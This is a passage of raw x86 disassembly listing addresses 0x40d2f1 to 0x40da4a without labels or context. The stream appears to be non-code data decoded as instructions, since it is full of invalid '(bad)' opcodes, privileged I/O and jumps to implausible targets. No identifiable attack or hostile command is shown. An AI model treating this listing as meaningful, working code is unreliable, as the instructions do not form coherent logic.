  40d2f1:	leave  
  40d2f2:	or     eax,0x4bdc419c
  40d2f7:	mov    eax,?
  40d2f9:	pop    ds
  40d2fa:	cmp    eax,0x26591dfe
  40d2ff:	ds cli 
  40d301:	sbb    BYTE PTR [edi*4+0x2d15bce2],ch
  40d308:	dec    ebx
  40d309:	repz rol eax,1
  40d30c:	inc    eax
  40d30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d30e:	into   
  40d30f:	scas   al,BYTE PTR es:[edi]
  40d310:	mov    ds:0x61aa9c01,al
  40d315:	mov    al,ds:0xbb53e920
  40d31a:	or     al,0x82
  40d31c:	xor    eax,0x64a7381c
  40d321:	inc    ebx
  40d322:	push   ds
  40d323:	scas   eax,DWORD PTR es:[edi]
  40d324:	pop    eax
  40d325:	nop
  40d326:	mov    ebx,0x7774b41c
  40d32b:	in     eax,dx
  40d32c:	cmp    BYTE PTR gs:[esi-0x54],bl
  40d330:	jmp    0x40d2e0
  40d332:	rcr    DWORD PTR [eax+0x32],cl
  40d335:	add    al,0x3
  40d337:	mov    WORD PTR [eax-0x77f94244],?
  40d33d:	mov    ebx,0xf267dbb
  40d342:	gs loopne 0x40d2f3
  40d345:	sbb    eax,0x2df5c7e8
  40d34a:	jb     0x40d329
  40d34c:	jo     0x40d317
  40d34e:	inc    esi
  40d34f:	and    bl,BYTE PTR [esi+0x19c3a02d]
  40d355:	xchg   esi,eax
  40d356:	(bad)  
  40d357:	or     edi,ecx
  40d359:	ror    BYTE PTR [ebx+0x7dca9721],cl
  40d35f:	aad    0x96
  40d361:	xor    edx,DWORD PTR [esi+0x32b7bc7e]
  40d367:	sub    al,0x90
  40d369:	sbb    eax,0x6d9488c7
  40d36e:	stc    
  40d36f:	js     0x40d39f
  40d371:	arpl   WORD PTR [edx+0x4d],sp
  40d374:	pop    edi
  40d375:	cmp    eax,0xa8884b47
  40d37a:	es jle 0x40d366
  40d37d:	xchg   esp,eax
  40d37e:	in     eax,0x7d
  40d380:	das    
  40d381:	bound  esi,QWORD PTR [ebx+0x816ef3]
  40d387:	cmp    ah,BYTE PTR [eax+0x6b]
  40d38a:	aad    0xc3
  40d38c:	mov    eax,DWORD PTR ss:[eax+ebx*2+0x62]
  40d391:	pop    edx
  40d392:	push   es
  40d393:	cld    
  40d394:	dec    eax
  40d395:	cdq    
  40d396:	lods   al,BYTE PTR ds:[esi]
  40d397:	rol    al,cl
  40d399:	pop    es
  40d39a:	mov    esi,0x7850458f
  40d39f:	xchg   BYTE PTR [ebx-0x6b30d67c],bl
  40d3a5:	push   ds
  40d3a6:	retf   
  40d3a7:	imul   ebx,DWORD PTR [edi+0x48125589],0xf80f791e
  40d3b1:	push   edi
  40d3b2:	into   
  40d3b3:	sbb    al,dh
  40d3b5:	scas   al,BYTE PTR es:[edi]
  40d3b6:	into   
  40d3b7:	js     0x40d3bd
  40d3b9:	call   FWORD PTR [ebx+0x76]
  40d3bc:	icebp  
  40d3bd:	dec    esi
  40d3be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3bf:	mov    edx,0xd1a5a527
  40d3c4:	and    DWORD PTR [ecx+eax*1],eax
  40d3c7:	dec    edi
  40d3c8:	outs   dx,DWORD PTR ds:[esi]
  40d3c9:	mov    ebp,DWORD PTR [eax+0x20]
  40d3cc:	or     eax,0x3717cd55
  40d3d1:	aam    0x68
  40d3d3:	push   ecx
  40d3d4:	mov    ah,0x1e
  40d3d6:	dec    edi
  40d3d7:	out    dx,eax
  40d3d8:	xchg   edx,eax
  40d3d9:	cld    
  40d3da:	lds    esp,FWORD PTR [edi+0x6f]
  40d3dd:	mov    ds:0x1bdb35e6,al
  40d3e2:	fsub   st(2),st
  40d3e4:	out    dx,al
  40d3e5:	in     eax,0xa9
  40d3e7:	fistp  QWORD PTR [esi-0xf]
  40d3ea:	or     esi,edi
  40d3ec:	clc    
  40d3ed:	adc    edi,DWORD PTR [edi+0xec4b268]
  40d3f3:	fsubr  DWORD PTR [eax-0x3fbae04d]
  40d3f9:	mov    ah,0x92
  40d3fb:	cmp    al,0xc
  40d3fd:	or     BYTE PTR [ecx+0x61],cl
  40d400:	mov    ds:0xf8f074bf,eax
  40d405:	and    DWORD PTR [eax],ebx
  40d407:	cmp    ecx,DWORD PTR [edi+edx*2+0x7c]
  40d40b:	std    
  40d40c:	mov    gs,WORD PTR [edx+ebx*4+0x72]
  40d410:	ja     0x40d430
  40d412:	jle    0x40d487
  40d414:	cmp    al,0xee
  40d416:	pop    eax
  40d417:	lods   al,BYTE PTR ds:[esi]
  40d418:	jne    0x40d45d
  40d41a:	xchg   ebx,eax
  40d41b:	push   edi
  40d41c:	scas   al,BYTE PTR es:[edi]
  40d41d:	pop    edi
  40d41e:	sbb    al,0xc5
  40d420:	add    eax,0xb30e3b11
  40d425:	sbb    dl,dh
  40d427:	mov    DWORD PTR [ebp+0x4ac281f6],eax
  40d42d:	adc    DWORD PTR [ebp+0x18],ecx
  40d430:	dec    edx
  40d431:	mov    edi,0x23cb1fce
  40d436:	push   ebp
  40d437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d438:	fdivr  DWORD PTR [ecx-0x18]
  40d43b:	shr    dl,0xbc
  40d43e:	and    al,BYTE PTR [esi+0xecb02c5]
  40d444:	push   eax
  40d445:	adc    DWORD PTR [ecx+edx*2-0x2528acf7],ebx
  40d44c:	adc    bh,BYTE PTR [eax+0x56]
  40d44f:	dec    ebp
  40d450:	xor    bl,BYTE PTR [eax]
  40d452:	mov    dl,0x49
  40d454:	add    BYTE PTR [ecx],ch
  40d456:	sar    DWORD PTR [edx+0x3a],1
  40d459:	sar    DWORD PTR [edx+0x19],cl
  40d45c:	seto   BYTE PTR [esi+0x5c6413ae]
  40d463:	stos   BYTE PTR es:[edi],al
  40d464:	mov    BYTE PTR [ecx+edi*8-0x7d13a81c],ch
  40d46b:	test   al,0x1d
  40d46d:	mov    al,ds:0x3531c417
  40d472:	xchg   edi,eax
  40d473:	xor    edi,DWORD PTR [ebp-0x36c5d42]
  40d479:	pop    esi
  40d47a:	(bad)  
  40d47b:	jp     0x40d482
  40d47d:	mov    BYTE PTR [edx+0x1d1df104],0xba
  40d484:	inc    esp
  40d485:	jg     0x40d4cb
  40d487:	icebp  
  40d488:	ss sbb cl,cl
  40d48b:	retf   
  40d48c:	mov    bl,0xd5
  40d48e:	leave  
  40d48f:	or     al,0x50
  40d491:	xchg   DWORD PTR [ebp-0x75],ecx
  40d494:	xor    DWORD PTR [eax+0x74a72727],ebx
  40d49a:	and    DWORD PTR [edi],ecx
  40d49c:	lahf   
  40d49d:	shl    BYTE PTR [esi+eiz*1],1
  40d4a0:	stos   BYTE PTR es:[edi],al
  40d4a1:	loopne 0x40d432
  40d4a3:	cdq    
  40d4a4:	les    ebx,FWORD PTR [ebx-0x45]
  40d4a7:	daa    
  40d4a8:	imul   ebx,DWORD PTR [eax],0xffffffe1
  40d4ab:	outs   dx,BYTE PTR ds:[esi]
  40d4ac:	adc    ah,BYTE PTR [esi+0x2c]
  40d4af:	repz pusha 
  40d4b1:	adc    dl,BYTE PTR [ebx+0x20608497]
  40d4b7:	push   ecx
  40d4b8:	hlt    
  40d4b9:	cmp    eax,0x26aba4e3
  40d4be:	mov    DWORD PTR [eax-0x6bbb31b],edx
  40d4c4:	inc    eax
  40d4c5:	cmp    al,0x71
  40d4c7:	in     al,0x3e
  40d4c9:	add    al,0xc5
  40d4cb:	mov    ebp,0x5ffe233f
  40d4d0:	mov    ds:0x6425f7e7,al
  40d4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d6:	in     al,0x79
  40d4d8:	into   
  40d4d9:	out    dx,eax
  40d4da:	or     ch,BYTE PTR [ebx-0x68]
  40d4dd:	sbb    BYTE PTR [edi-0x1c],al
  40d4e0:	sbb    edx,eax
  40d4e2:	je     0x40d4f3
  40d4e4:	jge    0x40d547
  40d4e6:	jg     0x40d4d7
  40d4e8:	dec    ecx
  40d4e9:	repnz enter 0x948a,0xc8
  40d4ee:	shl    al,cl
  40d4f0:	xor    eax,0x7ae67460
  40d4f5:	cmp    eax,0xd9555b24
  40d4fa:	daa    
  40d4fb:	mov    ebx,0x20978007
  40d500:	inc    ebp
  40d501:	jb     0x40d507
  40d503:	pop    esp
  40d504:	dec    edi
  40d505:	mov    bl,0xe5
  40d507:	add    dh,BYTE PTR [ecx]
  40d509:	mov    ebp,0x9ad6a0ea
  40d50e:	lods   eax,DWORD PTR ds:[esi]
  40d50f:	push   esp
  40d510:	mov    dl,0xff
  40d512:	pop    es
  40d513:	rcl    dl,0x4f
  40d516:	xchg   esi,eax
  40d517:	cmp    DWORD PTR [eax],esi
  40d519:	stos   BYTE PTR es:[edi],al
  40d51a:	gs dec edi
  40d51c:	test   BYTE PTR [edi],al
  40d51e:	fidivr WORD PTR [esi+esi*8+0x5d9a35c2]
  40d525:	fst    QWORD PTR [ebx+0x5a4ae839]
  40d52b:	fmul   QWORD PTR [ebx+ecx*4-0x62b9ed1c]
  40d532:	xchg   esi,eax
  40d533:	add    BYTE PTR [esi],al
  40d535:	push   edi
  40d536:	pop    edx
  40d537:	add    al,0xad
  40d539:	ins    BYTE PTR es:[edi],dx
  40d53a:	not    BYTE PTR [ebp+0x0]
  40d53d:	int3   
  40d53e:	(bad)  
  40d540:	loop   0x40d50d
  40d542:	mov    dh,0xdf
  40d544:	or     al,0x98
  40d546:	push   ecx
  40d547:	sub    ch,dh
  40d549:	cmp    edi,DWORD PTR [ecx]
  40d54b:	sbb    al,0x45
  40d54d:	sahf   
  40d54e:	pop    ds
  40d54f:	adc    BYTE PTR [edx+eax*4],dh
  40d552:	imul   ebp,eax,0xffffffc9
  40d555:	or     ebp,DWORD PTR ds:0x85ac2245
  40d55b:	test   al,0x57
  40d55d:	imul   ebx,ebp,0xffffffaf
  40d560:	out    dx,eax
  40d561:	dec    edi
  40d562:	and    BYTE PTR [esi+0x26110bb3],bl
  40d568:	out    dx,eax
  40d569:	imul   esp,DWORD PTR [ebx],0x74
  40d56c:	stc    
  40d56d:	inc    edx
  40d56e:	add    al,0xe5
  40d570:	enter  0x1524,0xde
  40d574:	lods   eax,DWORD PTR ds:[esi]
  40d575:	cmp    bl,dl
  40d577:	pusha  
  40d578:	push   esi
  40d579:	enter  0x9126,0xa5
  40d57d:	and    eax,0xffea4bbd
  40d582:	jae    0x40d521
  40d584:	ins    BYTE PTR es:[edi],dx
  40d585:	popa   
  40d586:	lods   al,BYTE PTR ds:[esi]
  40d587:	pop    edx
  40d588:	cmp    BYTE PTR [esi],ah
  40d58a:	sar    BYTE PTR [ecx-0x5b],1
  40d58d:	add    DWORD PTR [ebp+0x68],edi
  40d590:	aad    0xc8
  40d592:	loopne 0x40d613
  40d594:	dec    ebx
  40d595:	mov    ds:0xfef59110,eax
  40d59a:	mov    esp,ebx
  40d59c:	add    DWORD PTR [ebx],esp
  40d59e:	inc    ecx
  40d59f:	dec    ebx
  40d5a0:	push   0xe7499419
  40d5a5:	or     ebx,DWORD PTR [ecx+0x46e3a8d0]
  40d5ab:	push   ecx
  40d5ac:	xor    cl,BYTE PTR [eax]
  40d5ae:	sub    BYTE PTR ds:0xa79c7ab2,0x13
  40d5b5:	pop    ds
  40d5b6:	add    eax,0xa24d42c8
  40d5bb:	das    
  40d5bc:	mov    WORD PTR [edx-0x25fd76e],ds
  40d5c2:	pop    edi
  40d5c3:	cmp    DWORD PTR [eax+0xb39625f],edx
  40d5c9:	fst    QWORD PTR [edi]
  40d5cb:	jne    0x40d58e
  40d5cd:	dec    BYTE PTR [ebx-0x7a]
  40d5d0:	repnz mov dl,0x19
  40d5d3:	mov    cl,0x15
  40d5d5:	loope  0x40d63e
  40d5d7:	retf   0x84f9
  40d5da:	push   ebp
  40d5db:	cmp    DWORD PTR [edi],ebp
  40d5dd:	push   cs
  40d5de:	jo     0x40d5aa
  40d5e0:	daa    
  40d5e1:	lods   eax,DWORD PTR ds:[esi]
  40d5e2:	sbb    eax,0x7acc0811
  40d5e7:	sub    bh,BYTE PTR [ecx+0x7]
  40d5ea:	add    eax,0x19e940e7
  40d5ef:	and    ebx,DWORD PTR [eax-0x36]
  40d5f2:	std    
  40d5f3:	adc    dh,BYTE PTR [edi+ecx*2-0x24]
  40d5f7:	loop   0x40d654
  40d5f9:	jo     0x40d679
  40d5fb:	outs   dx,BYTE PTR ds:[esi]
  40d5fc:	mov    ds:0x3058dc70,al
  40d601:	push   edx
  40d602:	push   eax
  40d603:	not    BYTE PTR [eax+0x2b]
  40d606:	dec    eax
  40d607:	shl    ecx,0x5a
  40d60a:	ud0    ebx,DWORD PTR [edx]
  40d60d:	ja     0x40d62b
  40d60f:	adc    eax,esi
  40d611:	cmp    al,0x87
  40d613:	mov    fs,WORD PTR [esi+0x7fc9b6cf]
  40d619:	xor    BYTE PTR [eax+ebx*2-0x66004a88],bh
  40d620:	mov    bl,bl
  40d622:	xor    ebx,DWORD PTR [ebp-0x37]
  40d625:	xor    edi,DWORD PTR [edx-0x668ceba0]
  40d62b:	sub    BYTE PTR [ecx-0x35a5febf],cl
  40d631:	sti    
  40d632:	pop    ecx
  40d633:	lds    ebx,FWORD PTR [ebx+eax*2-0x21]
  40d637:	clc    
  40d638:	pop    ss
  40d639:	sub    BYTE PTR [edx+0x5a8a327e],ch
  40d63f:	mov    edx,0x1cbe83ef
  40d644:	push   ecx
  40d645:	jl     0x40d66b
  40d647:	call   0x3915f67e
  40d64c:	mov    ds:0xc8ee0eb1,eax
  40d651:	fwait
  40d652:	shl    BYTE PTR [esi-0x4a55b214],1
  40d658:	enter  0x4d03,0x2f
  40d65c:	retf   
  40d65d:	inc    ebp
  40d65e:	bound  ebp,QWORD PTR [eax-0x7dbc5373]
  40d664:	repnz or DWORD PTR [eax+0x65920693],esi
  40d66b:	and    DWORD PTR [ebp-0x6a],eax
  40d66e:	ret    
  40d66f:	int    0x71
  40d671:	and    eax,0xf7b84f08
  40d676:	adc    edx,DWORD PTR [ebx+0xe]
  40d679:	sbb    cl,BYTE PTR [ecx-0x6bb52557]
  40d67f:	mov    BYTE PTR [eax+0x50b7b819],dh
  40d685:	jno    0x40d6a8
  40d687:	test   eax,edi
  40d689:	xchg   BYTE PTR [ecx-0x159d7eaa],ah
  40d68f:	inc    edx
  40d690:	es jno 0x40d661
  40d693:	js     0x40d62a
  40d695:	mov    ebx,ecx
  40d697:	je     0x40d6c8
  40d699:	test   dl,ah
  40d69b:	inc    edi
  40d69c:	fs jg  0x40d6e0
  40d69f:	fmul   DWORD PTR [edi+0x26]
  40d6a2:	sbb    dl,BYTE PTR [esi]
  40d6a4:	xor    DWORD PTR [eax],0x6828cdf2
  40d6aa:	aam    0xf
  40d6ac:	(bad)  
  40d6ad:	adc    eax,0x97bf53bf
  40d6b2:	adc    al,0x89
  40d6b4:	add    bl,bl
  40d6b6:	and    eax,0xdbb6a416
  40d6bb:	cdq    
  40d6bc:	jl     0x40d649
  40d6be:	dec    esi
  40d6bf:	xor    ebx,DWORD PTR [ecx-0x192afd32]
  40d6c5:	inc    ebp
  40d6c6:	dec    edx
  40d6c7:	and    al,0x18
  40d6c9:	iret   
  40d6ca:	mov    al,ds:0x757b15a9
  40d6cf:	dec    edi
  40d6d0:	and    DWORD PTR [edx],ebp
  40d6d2:	sub    al,0x9
  40d6d4:	sti    
  40d6d5:	sub    ecx,DWORD PTR [ebp+0x73]
  40d6d8:	mov    esp,0xdc97f5a1
  40d6dd:	and    eax,0xd06c9872
  40d6e2:	sbb    eax,0x1d214a8c
  40d6e7:	lahf   
  40d6e8:	mov    ah,0x40
  40d6ea:	xlat   BYTE PTR ds:[ebx]
  40d6eb:	mov    ecx,0x8cb745d8
  40d6f0:	clc    
  40d6f1:	push   ds
  40d6f2:	popa   
  40d6f3:	aas    
  40d6f4:	xor    BYTE PTR [eax+0x15a3dd32],bh
  40d6fa:	inc    ebx
  40d6fb:	mov    gs,WORD PTR [esi]
  40d6fd:	mov    dh,0xfc
  40d6ff:	push   0xb77c9c00
  40d704:	dec    esi
  40d705:	shl    DWORD PTR ds:0x2f43c867,0xc7
  40d70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d70d:	(bad)  
  40d70e:	jo     0x40d6af
  40d710:	or     al,0xb9
  40d712:	pop    ebx
  40d713:	lds    eax,FWORD PTR [ebx+0x57]
  40d716:	push   es
  40d717:	xlat   BYTE PTR ds:[ebx]
  40d718:	stos   DWORD PTR es:[edi],eax
  40d719:	aas    
  40d71a:	or     edx,DWORD PTR [ebx+ebp*1+0x28]
  40d71e:	mov    ah,0x8a
  40d720:	mov    eax,0x8e179dc6
  40d725:	lods   al,BYTE PTR ds:[esi]
  40d726:	fmul   QWORD PTR [ebp+0x5fb6161d]
  40d72c:	xchg   ecx,eax
  40d72d:	sbb    DWORD PTR [eax+edx*8+0x492fcfa4],esi
  40d734:	fst    DWORD PTR [ebx+0x6d]
  40d737:	retf   
  40d738:	(bad)
  40d73b:	pop    ebx
  40d73c:	hlt    
  40d73d:	mov    ds:0xe9acd86,al
  40d742:	xor    esi,DWORD PTR [esi]
  40d744:	in     eax,dx
  40d745:	jb     0x40d71c
  40d747:	add    eax,0x53a591f0
  40d74c:	(bad)  
  40d74d:	mov    eax,ds:0x8fcf1f2e
  40d752:	xor    al,0x35
  40d754:	aaa    
  40d755:	fwait
  40d756:	inc    ebp
  40d757:	add    DWORD PTR [edi-0x4575a007],eax
  40d75d:	out    0xc,al
  40d75f:	into   
  40d760:	pop    ebx
  40d761:	xchg   ebp,eax
  40d762:	into   
  40d763:	out    dx,eax
  40d764:	cwde   
  40d765:	iret   
  40d766:	lds    ebx,FWORD PTR [esi-0x4f]
  40d769:	(bad)
  40d76c:	dec    esp
  40d76d:	fs dec ebx
  40d76f:	test   eax,0x2fcf839b
  40d774:	jle    0x40d7de
  40d776:	adc    DWORD PTR ds:0x1f9ec80b,ebx
  40d77c:	and    BYTE PTR [ecx-0x1543350b],0x13
  40d783:	cld    
  40d784:	in     eax,0x54
  40d786:	xchg   esi,eax
  40d787:	jge    0x40d7a0
  40d789:	test   DWORD PTR [eax+0x442dc133],0xf90d5167
  40d793:	iret   
  40d794:	les    ebx,FWORD PTR ds:0x626a8682
  40d79a:	sub    eax,0x5e808f74
  40d79f:	fistp  WORD PTR [ecx+edx*2+0x29]
  40d7a3:	fmul   st(1),st
  40d7a5:	jl     0x40d774
  40d7a7:	jns    0x40d735
  40d7a9:	mov    eax,0x6d66cc3f
  40d7ae:	mov    BYTE PTR [edx-0x5d40e6fb],al
  40d7b4:	dec    ebp
  40d7b5:	xchg   ecx,eax
  40d7b6:	mov    bp,0xdea2
  40d7ba:	ret    0x1b11
  40d7bd:	sbb    dh,BYTE PTR [ebp-0x58]
  40d7c0:	or     DWORD PTR [ebp+0x5e],esi
  40d7c3:	cmp    al,BYTE PTR [edi]
  40d7c5:	cwde   
  40d7c6:	mov    eax,0x866d24c
  40d7cb:	cmp    eax,0x9b592edd
  40d7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d1:	jmp    0x9926:0x2590debf
  40d7d8:	fs dec ecx
  40d7da:	xchg   ebx,eax
  40d7db:	inc    ecx
  40d7dc:	popf   
  40d7dd:	fs push ds
  40d7df:	sti    
  40d7e0:	popa   
  40d7e1:	ret    
  40d7e2:	sbb    BYTE PTR [esi],dl
  40d7e4:	out    dx,eax
  40d7e5:	(bad)  
  40d7e6:	out    0xa3,eax
  40d7e8:	push   ss
  40d7e9:	mov    DWORD PTR [edi-0x4c161520],esp
  40d7ef:	adc    DWORD PTR [esi-0x7a],esp
  40d7f2:	arpl   WORD PTR [ebp+0x68d8d9be],bx
  40d7f8:	xor    eax,DWORD PTR [eax-0x7b]
  40d7fb:	push   edx
  40d7fc:	scas   al,BYTE PTR es:[edi]
  40d7fd:	not    BYTE PTR [esi-0x54]
  40d800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d801:	dec    esp
  40d802:	(bad)  
  40d803:	div    DWORD PTR [ebx+0x17]
  40d806:	mov    WORD PTR [esi+0x33],ds
  40d809:	retf   
  40d80a:	or     ecx,esp
  40d80c:	imul   ebp,DWORD PTR [edi],0xffffffd4
  40d80f:	test   DWORD PTR ds:[ecx],ecx
  40d812:	shr    eax,1
  40d814:	stc    
  40d815:	add    eax,0x9b0d351
  40d81a:	sahf   
  40d81b:	add    al,0xb9
  40d81d:	arpl   WORD PTR [esi+0x65538be0],dx
  40d823:	iret   
  40d824:	das    
  40d825:	test   DWORD PTR [edi],eax
  40d827:	call   0x68e073ad
  40d82c:	scas   al,BYTE PTR es:[edi]
  40d82d:	xchg   esp,eax
  40d82e:	push   cs
  40d82f:	dec    ecx
  40d830:	retf   
  40d831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d832:	pop    esi
  40d833:	in     al,0xf5
  40d835:	cli    
  40d836:	xor    eax,0xa1600ef7
  40d83b:	xchg   ebx,eax
  40d83c:	inc    ebp
  40d83d:	out    dx,eax
  40d83e:	fst    QWORD PTR [esp+esi*8+0x39907283]
  40d845:	sbb    al,0x44
  40d847:	add    eax,0x64cac686
  40d84c:	push   edi
  40d84d:	fwait
  40d84e:	push   0xffffffd5
  40d850:	fistp  QWORD PTR [esi+edi*1+0x56]
  40d854:	dec    eax
  40d855:	add    eax,0xc7420e47
  40d85a:	in     al,dx
  40d85b:	(bad)  
  40d85c:	stc    
  40d85d:	je     0x40d846
  40d85f:	xor    DWORD PTR [ecx-0x4cd2bba],edi
  40d865:	call   0xf953:0x71a719f6
  40d86c:	sbb    DWORD PTR [ebp-0x68aec478],0x64
  40d873:	das    
  40d874:	es data16 or al,0xb6
  40d878:	outs   dx,BYTE PTR ds:[esi]
  40d879:	ss sbb al,0xa4
  40d87c:	ficomp WORD PTR [esi+0x2e]
  40d87f:	mov    ebx,0x342ce42c
  40d884:	test   al,0x58
  40d886:	int3   
  40d887:	stos   DWORD PTR es:[edi],eax
  40d888:	(bad)  
  40d889:	jge    0x40d817
  40d88b:	test   DWORD PTR [ecx],edi
  40d88d:	rcr    DWORD PTR [edi],0x96
  40d890:	jo     0x40d8ed
  40d892:	inc    ebp
  40d893:	fdiv   st,st(7)
  40d895:	sub    ah,al
  40d897:	out    dx,al
  40d898:	dec    ebx
  40d899:	jo     0x40d89a
  40d89b:	mov    bh,0x9a
  40d89d:	sar    DWORD PTR [ecx],0x7f
  40d8a0:	xchg   ebx,eax
  40d8a1:	xor    ah,BYTE PTR [ebx]
  40d8a3:	bound  ecx,QWORD PTR [edx+0x3e]
  40d8a6:	(bad)  
  40d8a7:	in     eax,dx
  40d8a8:	and    al,0xb2
  40d8aa:	scas   al,BYTE PTR es:[edi]
  40d8ab:	out    0xc7,al
  40d8ad:	out    0x9c,al
  40d8af:	int3   
  40d8b0:	mov    ebp,0x2b4b85d3
  40d8b5:	inc    ebp
  40d8b6:	(bad)  
  40d8b8:	ins    DWORD PTR es:[edi],dx
  40d8b9:	jge    0x40d8c3
  40d8bb:	pop    ebx
  40d8bc:	sbb    cl,BYTE PTR ds:0x661883b3
  40d8c2:	pop    ss
  40d8c3:	loope  0x40d8b0
  40d8c5:	shl    cl,0x55
  40d8c8:	or     DWORD PTR [eax-0x901dfa3],0x3591f83e
  40d8d2:	mov    esi,0x4d5cfa2b
  40d8d7:	ins    BYTE PTR es:[edi],dx
  40d8d8:	adc    al,0x25
  40d8da:	xchg   ebx,eax
  40d8db:	jge    0x40d89c
  40d8dd:	mov    DWORD PTR [esi+esi*2],esi
  40d8e0:	shl    DWORD PTR [edx-0x3d],cl
  40d8e3:	and    DWORD PTR [esi+0x6b],ebx
  40d8e6:	scas   eax,DWORD PTR es:[edi]
  40d8e7:	dec    eax
  40d8e8:	push   ecx
  40d8e9:	mov    ds:0x37f1830b,eax
  40d8ee:	inc    esi
  40d8f0:	sar    ebx,0x7f
  40d8f3:	out    dx,al
  40d8f4:	popf   
  40d8f5:	jge    0x40d8cf
  40d8f7:	jle    0x40d8a0
  40d8f9:	dec    edx
  40d8fa:	sub    edx,DWORD PTR [esi+0xd]
  40d8fd:	out    dx,eax
  40d8fe:	repz ss in eax,0xdd
  40d902:	stos   BYTE PTR es:[edi],al
  40d903:	shl    ch,1
  40d905:	in     eax,dx
  40d906:	sbb    al,0x7
  40d908:	rcr    ch,1
  40d90a:	loop   0x40d922
  40d90c:	jnp    0x40d8b7
  40d90e:	inc    ebp
  40d90f:	xor    bh,ch
  40d911:	mov    ebx,0x4f0d15b5
  40d916:	leave  
  40d917:	xlat   BYTE PTR ds:[ebx]
  40d918:	jnp    0x40d986
  40d91a:	mov    DWORD PTR [esi+0x3fd4ebbb],edi
  40d920:	or     DWORD PTR [edx-0x5d9fe872],0xffffffb6
  40d927:	mov    eax,0x7535d81e
  40d92c:	or     al,0xc8
  40d92e:	or     eax,0xe17fcea
  40d933:	lea    esi,[edx+ebp*1+0x4b]
  40d937:	inc    ebx
  40d938:	pusha  
  40d939:	xchg   esp,eax
  40d93a:	test   al,0x68
  40d93c:	into   
  40d93d:	add    edi,eax
  40d93f:	xchg   ecx,eax
  40d940:	or     WORD PTR [eax+0x6c858c54],cx
  40d947:	imul   esi,DWORD PTR [esi+0x5fa5ce45],0xffffff9a
  40d94e:	(bad)
  40d951:	test   DWORD PTR [edi],ebp
  40d953:	xor    eax,DWORD PTR ds:0xe73d3550
  40d959:	or     eax,ebp
  40d95b:	lds    edx,FWORD PTR [ebx]
  40d95d:	mov    dh,BYTE PTR [ecx-0x78]
  40d960:	outs   dx,DWORD PTR ds:[esi]
  40d961:	(bad)  
  40d962:	sub    esp,ecx
  40d964:	scas   eax,DWORD PTR es:[edi]
  40d965:	xor    eax,0x11911621
  40d96a:	out    0xa,eax
  40d96c:	sbb    eax,0x803f451
  40d971:	lods   eax,DWORD PTR ds:[esi]
  40d972:	test   BYTE PTR [eax],ch
  40d974:	(bad)  
  40d976:	xchg   edx,eax
  40d977:	mov    esi,0xe70ce080
  40d97c:	cwde   
  40d97d:	jbe    0x40d915
  40d97f:	stc    
  40d980:	cmp    DWORD PTR [eax+0x21],0xe1235d3b
  40d987:	imul   ebp,ecx,0x37
  40d98a:	or     dl,BYTE PTR [ecx-0x7ddc9279]
  40d990:	dec    edi
  40d991:	out    dx,al
  40d992:	adc    al,0x5e
  40d994:	jo     0x40d97c
  40d996:	mov    BYTE PTR [ebx],dh
  40d998:	out    dx,al
  40d999:	dec    esi
  40d99a:	lods   al,BYTE PTR ds:[esi]
  40d99b:	push   eax
  40d99c:	mov    dl,0x55
  40d99e:	scas   al,BYTE PTR es:[edi]
  40d99f:	in     al,dx
  40d9a0:	sub    al,0x65
  40d9a2:	shl    dh,cl
  40d9a4:	add    BYTE PTR ds:0x53e507c0,cl
  40d9aa:	push   0xffffffe0
  40d9ac:	loopne 0x40d92f
  40d9ae:	and    DWORD PTR [esi-0x37],ebp
  40d9b1:	xchg   edx,eax
  40d9b2:	fnstsw WORD PTR [eax+0x1c]
  40d9b5:	or     dh,BYTE PTR [esp+esi*4+0x39d4df32]
  40d9bc:	les    ebx,FWORD PTR [ecx+0x9]
  40d9bf:	or     eax,DWORD PTR [edi-0x34]
  40d9c2:	mov    eax,ds:0x27528d54
  40d9c7:	int3   
  40d9c8:	outs   dx,BYTE PTR ds:[esi]
  40d9c9:	fwait
  40d9ca:	jl     0x40da03
  40d9cc:	push   ecx
  40d9cd:	mov    eax,eax
  40d9cf:	std    
  40d9d0:	scas   al,BYTE PTR es:[edi]
  40d9d1:	inc    edi
  40d9d2:	(bad)  
  40d9d3:	pop    ebx
  40d9d4:	sub    dh,cl
  40d9d6:	pop    ds
  40d9d7:	gs xchg edx,eax
  40d9d9:	mov    edi,0xa5a99f53
  40d9de:	ficom  WORD PTR [eax+0x50]
  40d9e1:	cld    
  40d9e2:	push   cs
  40d9e3:	popa   
  40d9e4:	ds inc edx
  40d9e6:	mov    eax,0xf1151f80
  40d9eb:	xchg   ebx,eax
  40d9ec:	jmp    ebx
  40d9ee:	sbb    eax,0xa827c42b
  40d9f3:	inc    edx
  40d9f4:	pushf  
  40d9f5:	inc    edi
  40d9f6:	push   ebp
  40d9f7:	daa    
  40d9f8:	fs pushf 
  40d9fa:	jns    0x40d99f
  40d9fc:	push   esp
  40d9fd:	fidivr WORD PTR [edi+edi*8]
  40da00:	mov    cl,0xe8
  40da02:	mov    bh,0xa5
  40da04:	icebp  
  40da05:	push   ds
  40da06:	cmp    DWORD PTR [ecx+0x20],eax
  40da09:	push   es
  40da0a:	jno    0x40da70
  40da0c:	pop    ss
  40da0d:	popw   ss
  40da0f:	mov    cl,0x8c
  40da11:	retf   
  40da12:	mov    bh,0x85
  40da14:	repz inc esp
  40da16:	sbb    al,0x94
  40da18:	push   ebx
  40da19:	jns    0x40d9a2
  40da1b:	pop    ecx
  40da1c:	or     ebp,DWORD PTR [ecx]
  40da1e:	or     DWORD PTR [esi],eax
  40da20:	(bad)  
  40da21:	mov    esp,0xcaebc663
  40da26:	loopne 0x40daa4
  40da28:	rep lods eax,DWORD PTR ds:[esi]
  40da2a:	pop    ebp
  40da2b:	icebp  
  40da2c:	cwde   
  40da2d:	nop
  40da2e:	sti    
  40da2f:	ja     0x40da5e
  40da31:	out    dx,al
  40da32:	adc    al,0x6f
  40da34:	popf   
  40da35:	loopne 0x40da3b
  40da37:	into   
  40da38:	imul   esi,DWORD PTR [edx],0x13733c28
  40da3e:	push   es
  40da3f:	test   DWORD PTR [edx+0x1],edx
  40da42:	xchg   esi,eax
  40da43:	pop    ss
  40da44:	adc    ecx,0x4a
  40da47:	mov    bl,0x45
  40da49:	pop    ebx
  40da4a:	push   ds
